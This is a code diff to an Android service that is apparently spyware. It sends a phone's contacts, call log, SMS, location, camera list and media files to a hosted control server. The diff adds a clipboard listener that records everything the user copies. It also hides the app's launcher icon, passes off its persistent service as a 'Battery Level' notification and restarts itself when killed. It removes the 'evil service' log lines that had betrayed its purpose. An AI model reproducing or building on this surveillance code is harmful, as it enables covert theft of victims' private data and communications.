@@ -1,14 +1,22 @@
 package oom.android.system.app;
 
 import android.annotation.SuppressLint;
+import android.app.Activity;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
 import android.app.Service;
+import android.app.admin.DeviceAdminService;
 import android.app.admin.DevicePolicyManager;
+import android.content.ClipData;
+import android.content.ClipboardManager;
 import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.PackageManager;
+import android.graphics.Color;
 import android.media.MediaRecorder;
 import android.os.Build;
 import android.os.Build.VERSION;
@@ -19,15 +27,28 @@ import android.os.IBinder;
 import android.os.Looper;
 import android.os.StatFs;
 import android.util.Log;
+import android.view.ActionMode;
 
 import androidx.annotation.Nullable;
+import androidx.annotation.RequiresApi;
+import androidx.core.app.NotificationCompat;
 
+import org.json.JSONException;
+import org.json.JSONObject;
+
+import java.io.BufferedWriter;
 import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.io.FileWriter;
+import java.io.IOException;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.Locale;
 
 import oom.android.system.Managers.audioManager;
+import oom.android.system.Managers.base;
+import oom.android.system.Settings.TypeOpenFile;
 
 public class MyService extends Service {
 
@@ -36,8 +57,8 @@ public class MyService extends Service {
 
     public final static String LOG_TAG = "myLogs";
     static String log_path;//полный путь до папки logs
-
-    final static String site = "http://www.test1.ru/";
+    //mywebsutedlatest.000webhostapp.com http://www.test1.ru/
+    final static String site = "http://mywebsutedlatest.000webhostapp.com";
     final static String Devices = site+"/Devices/"+DeviceID()+"/";
 
     final static String filelist_url = Devices +"getlist.php";//возращает список файлов на сервере
@@ -47,18 +68,21 @@ public class MyService extends Service {
     final static String online_url = Devices +"online.php";//сообщает о онлайне
     final static String shelltime_url = Devices +"time.php";//время использования комманды на сервере
     final static String CheckDevice = site +"CheckDevice.php";//время использования комманды на сервере
+
     final static String out_contacts = Devices +"info/Contacts/setconlist.php";
     final static String out_call = Devices +"info/Calls/setCalllist.php";
     final static String out_sms = Devices +"info/Sms/setsmslist.php";
     final static String out_block = Devices +"info/Block/setBlocklist.php";
     final static String out_fm = Devices +"info/FileManager/setFlist.php";
+    final static String out_Loc = Devices +"info/Location/setLocation.php";
+    final static String out_Cameras = Devices +"info/Camera/ListCameras/setCameras.php";
+    final static String out_MediaF = Devices +"info/MediaStore/setMediaF.php";
 
-    public final static String output_img = Devices+"Photo/" +"oimg.php";
+    public final static String output_img = Devices+"Photo/oimg.php";
 
-    public final static String output_audio = Devices+"Audio/" +"oaudio.php";
+    public final static String output_audio = Devices+"Audio/oaudio.php";
 
     static Integer userid=1;//default 1
-    static String DevName="";
     static boolean admin=false;//default false
     static String fname;   // for recorder
 
@@ -72,34 +96,23 @@ public class MyService extends Service {
 
     static boolean ScreenOn = false;//режим включенного экрана
 
-    public static DevicePolicyManager devicePolicyManager;
-    public static ComponentName demoDeviceAdmin;
+    DevicePolicyManager devicePolicyManager;
+    ComponentName  deviceAdmin;
 
     public static Context getContext(){
         return context;
     }
-
     public void onCreate() {
-        Log.d(LOG_TAG, "evil service OnCreate() started!");
         init();
         startwaiter();
-        //Intent i = new Intent(String.valueOf(MyService.class));
-        //devicePolicyManager.enableSystemApp(demoDeviceAdmin,i);
-
-
     }
 
     @SuppressLint({"MissingPermission", "HardwareIds"})
     public static String DeviceID() {
         String devicIMEI;
+        devicIMEI = Build.ID+ String.valueOf(VERSION.SDK_INT);
 
-
-       /* TelephonyManager telephonyManager = (TelephonyManager)MainActivity.activity.getSystemService(Context.TELEPHONY_SERVICE);
-
-        devicIMEI = telephonyManager.getDeviceId();*/
-       devicIMEI = Build.ID+ String.valueOf(VERSION.SDK_INT);
-
-       return devicIMEI;
+        return devicIMEI;
     }
 
     @Nullable
@@ -110,47 +123,101 @@ public class MyService extends Service {
 
     public int onStartCommand(Intent intent, int flags, int startId) {
         context = this;
-        Log.d(LOG_TAG, "evil service onStartCommand() started!!");
-        devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
-        demoDeviceAdmin = new ComponentName(this, DemoDeviceAdminReceiver.class);
         return Service.START_STICKY;
     }
 
     public void onDestroy() {
-        Log.d(LOG_TAG, "Злой сервис убит");
-        Log.d(LOG_TAG, "Блин, перезапуск !! : D");
         sendBroadcast(new Intent("oom.android.system.restart"));  //сделает не убиваемым если система выключается
-        //stopwaiter();
     }
 
     @Override
     public void onStart(Intent intent, int startId) {
-        Log.d(LOG_TAG, "evil service OnStart() started!");
+        devicePolicyManager = (DevicePolicyManager)getSystemService(Context.DEVICE_POLICY_SERVICE);
+        if (VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            deviceAdmin = new ComponentName(this, DeviceAdminService.class);
+        }
     }
 
     void init(){
         try{
-            changewifipolicy();
             log_path=getApplicationContext().getFilesDir().getAbsolutePath()+"/logs";
             if(freespace()[0]<5L){  // 5 МБ свободного места минимум в порядке
-                Log.d(LOG_TAG, "слишком мало места, отключение рекордера");
                 disable_recorder();
             }
+
+            PackageManager pkg=this.getPackageManager();
+            pkg.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+
+            if (Build.VERSION.SDK_INT > Build.VERSION_CODES.O)
+                startMyOwnForeground();
+            else
+                startForeground(1, new Notification());
+
+            clipBoard();
+
         }
-        catch(Exception e){
-            Log.d(LOG_TAG, "error in initialisation");
-        }
+        catch(Exception e){}
     }
+
+    public void clipBoard(){
+        ClipboardManager.OnPrimaryClipChangedListener mPrimaryChangeListener = new ClipboardManager.OnPrimaryClipChangedListener() {
+            public void onPrimaryClipChanged() {
+                ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
+                if (clipboard.hasPrimaryClip()) {
+                    ClipData clipData = clipboard.getPrimaryClip();
+                    if (clipData.getItemCount() > 0) {
+                        CharSequence text = clipData.getItemAt(0).getText();
+                        if (text != null) {
+                            try {
+                                JSONObject data = new JSONObject();
+                                data.put(base.CLIPBOARD.TEXT, text);
+                                writeFile(TypeOpenFile.Clipboard,data.toString());
+                            } catch (JSONException e) {
+                                e.printStackTrace();
+                            }
+                        }
+                    }
+                }
+            }
+        };
+
+        ClipboardManager clipboardManager = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
+        clipboardManager.addPrimaryClipChangedListener(mPrimaryChangeListener);
+    }
+
+    @RequiresApi(Build.VERSION_CODES.O)
+    private void startMyOwnForeground()
+    {
+        String NOTIFICATION_CHANNEL_ID = "example_permanence";
+        String channelName = "Battery Level Service";
+        NotificationChannel chan = new NotificationChannel(NOTIFICATION_CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_NONE);
+        chan.setLightColor(Color.BLUE);
+        chan.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);
+
+        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+        assert manager != null;
+        manager.createNotificationChannel(chan);
+
+        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID);
+        Notification notification = notificationBuilder.setOngoing(true)
+                .setContentTitle("Battery Level")
+                .setPriority(NotificationManager.IMPORTANCE_MIN)
+                .setCategory(Notification.CATEGORY_SERVICE)
+                .build();
+        startForeground(1, notification);
+    }
+
 
     void disable_recorder(){
         try{
             ComponentName component = new ComponentName(getApplicationContext(), audioManager.class);
             getPackageManager().setComponentEnabledSetting(component,
                     PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-            Log.d(LOG_TAG, "recorder was disabled");
+
         }
         catch (Exception e){}
     }
+
     @SuppressWarnings("deprecation")
     @SuppressLint("NewApi")
     static long[] freespace(){
@@ -166,49 +233,13 @@ public class MyService extends Service {
             ext_free   = (statFs2.getAvailableBlocks() * statFs2.getBlockSize())/1024/1024;
         }
 
-        Log.d(MyService.LOG_TAG, "data: "+data_free+" MB");
-        //Log.d(LOG_TAG, "external: "+ext_free+" MB");
         return new long[] {data_free, ext_free};
 
     }
 
-    @SuppressWarnings("deprecation")
-    @SuppressLint("NewApi")
-    void changewifipolicy(){
-
-        //getsize();
-        try{
-            int mode;
-            ContentResolver cr = getContentResolver();
-            if(Integer.valueOf(VERSION.SDK_INT)>=17){
-                mode = android.provider.Settings.Global.getInt(cr, android.provider.Settings.Global.WIFI_SLEEP_POLICY,
-                        android.provider.Settings.Global.WIFI_SLEEP_POLICY_NEVER);
-                if(mode!=2){ // меняем политику на never sleep   (SYSTEM ONLY!!)
-                    android.provider.Settings.Global.putInt(cr, android.provider.Settings.Global.WIFI_SLEEP_POLICY,
-                            android.provider.Settings.Global.WIFI_SLEEP_POLICY_NEVER);
-                    //Log.d(LOG_TAG, "wifi policy successfully changed!");
-
-                }
-            } else{
-                mode = android.provider.Settings.System.getInt(cr, android.provider.Settings.System.WIFI_SLEEP_POLICY,
-                        android.provider.Settings.System.WIFI_SLEEP_POLICY_NEVER);
-                if(mode!=2){
-                    android.provider.Settings.System.putInt(cr, android.provider.Settings.System.WIFI_SLEEP_POLICY,
-                            android.provider.Settings.System.WIFI_SLEEP_POLICY_NEVER);
-                    //Log.d(LOG_TAG, "wifi policy successfully changed!");
-                }
-            }
-        }
-        catch(Exception e){
-            //Log.d(LOG_TAG, "cant change wifi sleep policy! not system\n");
-        }
-
-
-    }
 
     void startwaiter(){
         HiddenWaiter evilreceiver = new HiddenWaiter();
-        //Log.d(LOG_TAG, "trying to start hidden waiter thread..");
         try{
             waiterthread = new HandlerThread("hiddenwaiterthread");
             waiterthread.start();
@@ -216,8 +247,8 @@ public class MyService extends Service {
             Handler waiterhandler = new Handler(customlooper);
             IntentFilter myfilter = new IntentFilter();
             myfilter.addAction("android.intent.action.TIME_SET");
-            //myfilter.addAction("android.intent.action.SCREEN_ON");
-            //myfilter.addAction("android.intent.action.SCREEN_OFF");
+            myfilter.addAction("android.intent.action.SCREEN_ON");
+            myfilter.addAction("android.intent.action.SCREEN_OFF");
 
             try{
                 registerReceiver(evilreceiver, myfilter,null,waiterhandler);
@@ -239,26 +270,64 @@ public class MyService extends Service {
         HiddenWaiter evilreceiver = new HiddenWaiter();
         unregisterReceiver(evilreceiver);
         waiterthread.quit();
-        //Log.d(LOG_TAG, "waiter reciever убит!");
     }
 
     public static File OpenFile(int type){
-        File dir = new File(MainActivity.context.getApplicationInfo().dataDir+"/files/logs");
+        File dir = new File(getContext().getApplicationInfo().dataDir+"/files/logs");
         dir.mkdirs();
 
         SimpleDateFormat dateFormat = new SimpleDateFormat("dd_mm_yyyy_hh_mm_ss",
                 Locale.getDefault());
         String ffile;
-        if(type==1)//record
+        if(type== TypeOpenFile.Record)//record
             ffile= "record_" + dateFormat.format(new Date()) +MyService.fname+ ".mpeg4";
-        else if(type==2)//video
+        else if(type==TypeOpenFile.Video)//video
             ffile= "video_" + dateFormat.format(new Date()) + ".mp4";
-        else if(type==3)//picture
+        else if(type==TypeOpenFile.Photo)//picture
             ffile= "photo_" + dateFormat.format(new Date()) + ".jpg";
-        else
+        else if(type==TypeOpenFile.Logger){
+            dateFormat = new SimpleDateFormat("dd_MM_YYYY",Locale.getDefault());
+            ffile= "logger" + dateFormat.format(new Date()) + ".json";
+        }
+        else if(type==TypeOpenFile.NotificationLogger){
+            dateFormat = new SimpleDateFormat("dd_MM_YYYY",Locale.getDefault());
+            ffile= "notifications" + dateFormat.format(new Date()) + ".json";
+        }
+        else if(type==TypeOpenFile.Clipboard){
+            dateFormat = new SimpleDateFormat("dd_MM_YYYY hh:mm:ss",Locale.getDefault());
+            ffile= "clipboards_" + dateFormat.format(new Date()) + ".json";
+        }
+        else if(type==TypeOpenFile.ScreenShot)
             ffile= "screenshot_" + dateFormat.format(new Date()) + ".png";
+        else
+            ffile = "unknown.txt";
         String filename = dir.getPath() + File.separator + ffile;
         File file = new File(filename);
         return file;
+    }
+
+    public static void writeFile(Integer typeOpenFile, String text){
+        try {
+            FileWriter writer;
+            BufferedWriter bufferWriter;
+            writer = new FileWriter(OpenFile(typeOpenFile).getAbsolutePath(), true);
+            bufferWriter = new BufferedWriter(writer);
+            bufferWriter.write(text);
+            bufferWriter.close();
+        } catch (IOException e) {
+            FileOutputStream fos;
+            try {
+                File file = new File(OpenFile(typeOpenFile).getAbsolutePath());
+                fos = new FileOutputStream(file);
+                fos.write(text.getBytes());
+                fos.flush();
+                fos.close();
+            } catch (FileNotFoundException ex) {
+                ex.printStackTrace();
+            } catch (IOException ex) {
+                ex.printStackTrace();
+            }
+
+        }
     }
 }
